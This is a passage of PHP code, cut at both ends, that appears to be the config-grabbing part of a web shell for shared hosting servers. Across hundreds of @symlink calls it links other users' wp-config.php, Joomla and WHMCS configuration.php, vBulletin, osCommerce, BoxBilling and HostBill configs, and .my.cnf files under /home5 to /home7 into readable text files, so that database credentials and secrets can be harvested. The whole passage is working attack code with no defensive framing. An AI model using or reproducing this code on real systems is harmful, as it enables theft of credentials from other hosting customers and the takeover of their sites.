    @symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home6

    @symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home 7 

    @symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
